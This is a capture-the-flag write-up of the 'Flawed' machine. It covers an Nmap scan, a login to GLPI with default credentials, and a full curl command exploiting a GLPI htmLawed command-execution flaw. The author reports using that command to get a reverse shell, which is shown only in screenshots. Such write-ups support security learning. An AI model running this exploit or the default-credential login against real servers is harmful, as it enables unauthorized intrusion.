# Flawed machine from brCTF

## Information Gathering/Reconnaissance
As is customary, we initiate our preferred network scanning tool, Nmap, to conduct initial reconnaissance. Our scan reveals that port 80, which is typically associated with HTTP and port 22, are accessible. <br>
`nmap -sC -sV -oN flawed.nmap 10.0.160.157`
```
Nmap scan report for 10.0.160.157
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Authentication - GLPI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

In the second phase of our reconnaissance, we proceed to examine the application hosted on port 80 by accessing it through our web browser. To our surprise, we are welcomed with a login page. Quite intriguing!
![GLPI Login](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/glpi-login.png "a title")

After a brief research on google we discovered default credentials for GLPI which we can try on out target.
![google glpi logins](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/glpi-default-creds.png "a title")

### Exploitation
We now attempt to login to GLPI and viola!!<br>
From there we move on with out recon and attempt to find the version of GLPI running. Hopefully we can find publicly available exploits.
![glpi logged in](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/checking-glpi-version.png "a title")
The version of GLPI can be seen in the photo below.
![glpi version enum](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/glpi-version.png "a title")

Now that we know the version running, we can google it to find avaiable exploits and shortly after, we find one on github from [Orange-CyberDefense](https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh)

**CURL Command to exploit the vulnerability** <br>
```curl -s -d 'sid=foo&hhook=exec&text=[command]' -b 'sid=foo' http://[target-ip]/vendor/htmlawed/htmlawed/htmLawedTest.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'```

Replace [command] and [target] with the command you  want to execute on the target and the IP address of the target respecfully.

We modify the exploit to get a reverse shell on out netcat listener.<br>
Firstly, we must make sure we are listening for incoming connections. <br>
![netcat listening](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/start-netcat-listener.png "a title")

Secondly, we prepare our exploit code to obtain a reverse shell.<br>
![preparing payload](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/modify-exploit.png "a title")

We can now execute the command and boom!! we get a connection on our listener. <br>
![conn reccv](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/nc-connectio-received.png "a title")
